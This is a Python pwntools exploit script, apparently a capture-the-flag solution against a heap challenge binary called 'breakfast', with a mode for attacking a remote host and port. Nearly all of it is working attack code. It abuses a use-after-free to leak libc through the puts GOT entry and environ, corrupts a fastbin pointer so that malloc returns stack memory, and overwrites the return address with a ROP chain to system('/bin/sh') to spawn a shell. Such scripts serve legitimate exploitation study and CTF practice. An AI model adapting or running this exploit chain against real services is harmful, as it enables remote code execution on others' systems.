# --==[[ Fastbin attack => ret2stack => ret2libc

from pwn import *

puts_got = 0x601fb8
puts_off = 0x6fd60
sys_off  = 0x46590
sh_off   = 0x180503
POP_RDI  = 0x400c03

def alloc(idx, size):

	r.sendlineafter('Exit\n', '1')
	r.sendlineafter('breakfast\n', str(idx))
	r.sendlineafter('kcal.\n', str(size))

	return

def edit(idx, data):

	r.sendlineafter('Exit\n', '2')
	r.sendlineafter('ingredients\n', str(idx))
	r.sendlineafter('ingredients\n', data)

	return

def dump(idx):

	r.sendlineafter('Exit\n', '3')
	r.sendlineafter('see\n', str(idx))

	return u64(r.recv(6).ljust(8, '\x00'))

def free(idx):

	r.sendlineafter('Exit\n', '4')
	r.sendlineafter('delete\n', str(idx))

	return

def pwn():

	alloc(0, 0x30)

	# Abuse UAF to place put's GOT entry
	edit(0, p64(puts_got))

	puts     = dump(0)
	libc     = puts - puts_off
	system   = libc + sys_off
	binsh    = libc + sh_off
	# There is an address in libc which contains the
	# address of the environment variable array
	env_libc = libc + 0x3c54a0

	log.success("Leak:    0x{:x}".format(puts))
	log.success("Libc:    0x{:x}".format(libc))
	log.success("system:  0x{:x}".format(system))
	
	edit(0, p64(env_libc))

	# Leak environ's array stack address
	environ  = dump(0)
	stack    = environ - 0x12e

	log.success("environ: 0x{:x}".format(environ))
	log.success("stack:   0x{:x}".format(stack))
	log.info("Fastbin attack => ret2stack => ret2libc")

	free(0)
	# Corrupt fd pointer to make malloc return the stack address
	edit(0, p64(stack))
	
	# 	0x603000:	0x0000000000000000	0x0000000000000041 <-- free & corrupted fd [stack address]
	#	0x603010:	0x00007fffffffe57a	0x000000000000000a
	#	0x603020:	0x0000000000000000	0x0000000000000000
	#	0x603030:	0x0000000000000000	0x0000000000000000
	#	0x603040:	0x0000000000000000	0x0000000000020fc1

	# malloc will return 0x603010
	alloc(0, 0x30)
	# malloc will return 0x00007fffffffe58a
	alloc(0, 0x30)
	# Overwrite stack and ROP to system
	edit(0, 'A'*0xe + p64(POP_RDI) + p64(binsh) + p64(system))
	
	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./breakfast')
        pause()
        pwn()
